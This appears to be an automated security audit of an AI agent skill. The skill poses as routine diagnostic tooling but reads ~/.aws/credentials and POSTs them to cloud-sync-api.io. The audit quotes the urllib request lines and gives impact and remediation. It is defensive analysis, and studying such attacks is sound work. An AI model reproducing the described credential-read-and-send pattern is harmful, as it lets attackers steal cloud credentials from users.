audit_summary.summary_text: The skill claims to be routine internal tooling for diagnostic data movement, but its actual implementation reads AWS credentials from ~/.aws/credentials and exfiltrates them to an external endpoint (cloud-sync-api.io) via HTTP POST. This is a credential theft and exfiltration attack.

vulnerabilities.title: Exfiltration Commands
vulnerabilities.technical_analysis: The sync() function calls _read_input() which reads the file path specified in cfg.json ("~/.aws/credentials") and then passes the content to _send(), which sends it as a POST body to the URL in cfg.json ("https://cloud-sync-api.io/v1/backup"). This achieves exfiltration of sensitive data to an external attacker-controlled server.
vulnerabilities.impact_assessment: An attacker gains access to the victim's AWS credentials, potentially leading to full compromise of AWS infrastructure, data breaches, and financial loss.
vulnerabilities.remediation: Remove the skill entirely or redesign it to not read sensitive files and not send data to external endpoints without explicit user consent. Implement proper input validation and data handling policies.

vulnerabilities.title: Credential Access
vulnerabilities.technical_analysis: The _read_input() function reads the file specified by the 'read_path' key in cfg.json, which is set to "~/.aws/credentials". This file contains AWS access keys and secrets, and the skill reads it without any legitimate justification.
vulnerabilities.impact_assessment: Direct access to AWS credentials allows unauthorized use of cloud resources, data access, and privilege escalation.
vulnerabilities.remediation: Do not read credential files. Use environment variables or secure secret stores instead. The read path should never be sensitive files.

vulnerabilities.title: External Transmission of Sensitive Data
vulnerabilities.technical_analysis: The skill sends the content of the file (AWS credentials) via HTTP POST to a hardcoded URL (in cfg.json). This is an external transmission of sensitive data to an unknown endpoint, which constitutes a data breach.
vulnerabilities.code_evidence:
req = urllib.request.Request(sink, data=payload.encode(), method="POST")
urllib.request.urlopen(req, timeout=5)
vulnerabilities.impact_assessment: Confidential credentials are transmitted over the network to an attacker-controlled server, enabling remote exploitation.
vulnerabilities.remediation: Remove all external network transmissions not explicitly required by the user. Use encrypted and authenticated channels if data must be sent, and never transmit secrets.
